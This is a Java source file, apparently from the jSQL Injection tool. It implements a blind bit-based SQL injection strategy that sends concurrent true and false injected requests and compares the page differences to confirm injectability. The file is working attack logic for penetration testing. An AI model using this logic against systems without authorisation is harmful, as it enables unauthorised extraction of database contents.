package com.jsql.model.injection.strategy.blind;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.callable.CallableBlindBit;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;

import static name.fraser.neil.plaintext.diff_match_patch.Diff;

/**
 * A blind attack class using concurrent threads.
 */
public class InjectionBlindBit extends AbstractInjectionMonobit<CallableBlindBit> {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    // Source code of the TRUE web page (usually ?id=1)
    private String sourceReferencePage;

    /**
     * List of string differences found in all the FALSE queries, compared
     * to the reference page. Each FALSE pages should contain
     * at least one same string, which shouldn't be present in all
     * the TRUE queries.
     */
    private List<Diff> falseDiffs = new ArrayList<>();

    /**
     * Create blind attack initialization.
     * If every false diffs are not in true diffs and every true diffs are in
     * true diffs, then Blind attack is confirmed.
     */
    public InjectionBlindBit(InjectionModel injectionModel, BlindOperator blindMode) {
        super(injectionModel, blindMode);
        
        // No blind
        if (this.falsyBit.isEmpty() || this.injectionModel.isStoppedByUser()) {
            return;
        }
        
        // Call the SQL request which must be TRUE (usually ?id=1)
        this.sourceReferencePage = this.callUrl(StringUtils.EMPTY, "bit#ref");

        // Concurrent calls to the FALSE statements,
        // it will use inject() from the model
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetBlindBitTagFalse");
        Collection<CallableBlindBit> callablesFalseTest = new ArrayList<>();
        for (String falseTest: this.falsyBit) {
            callablesFalseTest.add(new CallableBlindBit(
                falseTest,
                injectionModel,
                this,
                blindMode,
                "bit#falsy"
            ));
        }
        
        // Delete junk from the results of FALSE statements,
        // keep only diffs found in each and every FALSE pages.
        // Allow the user to stop the loop
        try {
            List<Future<CallableBlindBit>> futuresFalseTest = taskExecutor.invokeAll(callablesFalseTest);
            this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
            for (Future<CallableBlindBit> futureFalseTest: futuresFalseTest) {
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }
                if (this.falseDiffs.isEmpty()) {
                    this.falseDiffs = futureFalseTest.get().getDiffsWithReference();  // Init diffs
                } else {
                    this.falseDiffs.retainAll(futureFalseTest.get().getDiffsWithReference());  // Clean un-matching diffs
                }
            }
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        }

        if (this.injectionModel.isStoppedByUser()) {
            return;
        }
        
        this.cleanTrueDiffs(injectionModel, blindMode);
    }

    private void cleanTrueDiffs(InjectionModel injectionModel, BlindOperator blindMode) {
        // Concurrent calls to the TRUE statements,
        // it will use inject() from the model.
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetBlindBitTagTrue");
        Collection<CallableBlindBit> callablesTrueTest = new ArrayList<>();
        for (String trueTest: this.truthyBit) {
            callablesTrueTest.add(new CallableBlindBit(
                trueTest,
                injectionModel,
                this,
                blindMode,
                "bit#truthy"
            ));
        }
        
        // Remove TRUE diffs in the FALSE diffs, because
        // a significant FALSE statement shouldn't contain any TRUE diff.
        // Allow the user to stop the loop.
        try {
            List<Future<CallableBlindBit>> futuresTrueTest = taskExecutor.invokeAll(callablesTrueTest);
            this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
            for (Future<CallableBlindBit> futureTrueTest: futuresTrueTest) {
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }
                this.falseDiffs.removeAll(futureTrueTest.get().getDiffsWithReference());
            }
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        }
    }

    // todo should not be shared
    @Override
    public CallableBlindBit getCallableBitTest(String sqlQuery, int indexChar, int bit) {
        return new CallableBlindBit(
            sqlQuery,
            indexChar,
            bit,
            this.injectionModel,
            this,
            this.blindOperator,
            "bit#" + indexChar + "~" + bit
        );
    }

    @Override
    public boolean isInjectable() throws StoppedByUserSlidingException {
        if (this.injectionModel.isStoppedByUser()) {
            throw new StoppedByUserSlidingException();
        }
        var blindTest = new CallableBlindBit(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlBlindConfirm(),
            this.injectionModel,
            this,
            this.blindOperator,
            "bit#confirm"
        );
        try {
            blindTest.call();
        } catch (Exception e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        }
        return blindTest.isTrue() && !this.falseDiffs.isEmpty();
    }

    @Override
    public String getInfoMessage() {
        return "- Strategy Blind bit: query True when Diffs are matching " + this.falseDiffs + "\n\n";
    }
    
    
    // Getter and setter

    public String getSourceReferencePage() {
        return this.sourceReferencePage;
    }
    
    public List<Diff> getFalseDiffs() {
        return this.falseDiffs;
    }
}
